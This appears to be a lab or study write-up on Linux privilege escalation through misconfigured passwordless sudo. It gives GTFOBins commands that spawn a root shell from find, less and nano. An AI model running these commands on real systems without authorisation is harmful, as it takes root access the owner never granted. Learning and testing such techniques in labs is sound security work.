# 🔐 Privilege Escalation: Sudo

This privilege escalation technique focuses on abusing commands that can be executed with `sudo` privileges without requiring a password.

We can identify these commands and search for exploitation methods using the GTFOBins website.

---

## 🔍 Checking Sudo Permissions

We start by listing commands that can be executed with `sudo`:

```bash
sudo -l
```

![img](screenshots/sudo/sudo-l.png)

## 📌 Discovered Binaries

The system allows running the following binaries as root:

- `find`
- `less`
- `nano`

We can search for privilege escalation techniques for these binaries on:

https://gtfobins.linuxsec.org/

---

## 🚀 Exploiting `find`

GTFOBins provides the following command:

```bash
sudo find . -exec /bin/sh \; -quit
```

This command spawns a root shell.

![img](screenshots/sudo/get_root_by_sudo-l.png)

---

* **search for " less " exploit code for this bin ,and we find " sudo less /etc/hosts "**

![img](screenshots/sudo/sudo_less.png)

* **Inside this page write " !/bin/bash "**

![img](screenshots/sudo/inside_less.png)

* **Then click enter ,now uou have root privilege**

![img](screenshots/sudo/get_root_by_less.png)

---

* **search for " nano " exploit code for this bin ,and we find " sudo nano "**

![img](screenshots/sudo/sudo_nano.png)

* **Then click ^R^X To open "command to execute : "**

![img](screenshots/sudo/nano_execute_command.png)

* **Now write " reset; sh 1>&0 2>&0 "**

![img](screenshots/sudo/exploit_command_nano.png)

* **You have root privilege inside nano page**

![img](screenshots/sudo/get_root_by_nano.png)

